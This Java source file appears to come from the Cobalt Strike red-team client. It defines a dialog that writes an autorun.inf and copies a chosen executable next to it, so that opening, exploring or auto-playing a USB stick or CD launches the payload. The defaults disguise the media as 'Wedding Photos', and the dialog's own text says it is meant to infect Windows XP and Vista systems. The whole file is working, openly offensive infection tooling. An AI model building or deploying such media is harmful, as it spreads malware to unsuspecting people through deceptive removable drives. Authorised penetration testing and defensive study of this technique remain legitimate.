package aggressor.dialogs;

import aggressor.MultiFrame;
import common.CommonUtils;
import common.TeamQueue;
import dialog.*;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class AutoRunDialog implements DialogListener,
        SafeDialogCallback {
    protected MultiFrame window;
    protected JFrame dialog = null;
    protected TeamQueue conn;
    protected Map options = null;

    public AutoRunDialog(MultiFrame window, TeamQueue conn) {
        this.window = window;
        this.conn = conn;
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        this.options = options;
        SafeDialogs.openFile("Save AutoPlay files to...", null, null, false, true, this);
    }

    @Override
    public void dialogResult(String directory) {
        String exe = new File(this.options.get("EXE") + "").getName();
        File temp = new File(directory);
        temp.mkdirs();
        temp.mkdir();
        StringBuilder autorun = new StringBuilder();
        autorun.append("[autorun]\n");
        autorun.append("open=").append(exe).append("\n");
        autorun.append("action=").append(this.options.get("Action")).append("\n");
        autorun.append("icon=").append(this.options.get("Icon")).append("\n");
        autorun.append("label=").append(this.options.get("Label")).append("\n");
        autorun.append("shell\\Open\\command=").append(exe).append("\n");
        autorun.append("shell\\Explore\\command=").append(exe).append("\n");
        autorun.append("shell\\Search...\\command=").append(exe).append("\n");
        autorun.append("shellexecute=").append(exe).append("\n");
        autorun.append("UseAutoPlay=1\n");
        CommonUtils.writeToFile(new File(temp, "autorun.inf"), CommonUtils.toBytes(autorun.toString()));
        CommonUtils.copyFile(this.options.get("EXE") + "", new File(directory, exe));
        DialogUtils.showInfo("Created autorun.inf in " + directory + ".\nCopy files to root of USB drive or burn to CD.");
    }

    public void show() {
        this.dialog = DialogUtils.dialog("USB/CD AutoPlay", 640, 480);
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        controller.set("Action", "Open folder to view files");
        controller.set("Label", "Wedding Photos");
        controller.set("Icon", "%systemroot%\\system32\\shell32.dll,4");
        controller.text("Label", "Media Label:", 20);
        controller.text("Action", "AutoPlay Action:", 20);
        controller.text("Icon", "AutoPlay Icon:", 20);
        controller.file("EXE", "Executable:");
        JButton ok = controller.action("Launch");
        JButton help = controller.help("https://www.cobaltstrike.com/help-usb-autoplay-attack");
        this.dialog.add(DialogUtils.description("This package generates an autorun.inf that abuses the AutoPlay feature on Windows. Use this package to infect Windows XP and Vista systems through CDs and USB sticks."), "North");
        this.dialog.add(controller.layout(), "Center");
        this.dialog.add(DialogUtils.center(ok, help), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}

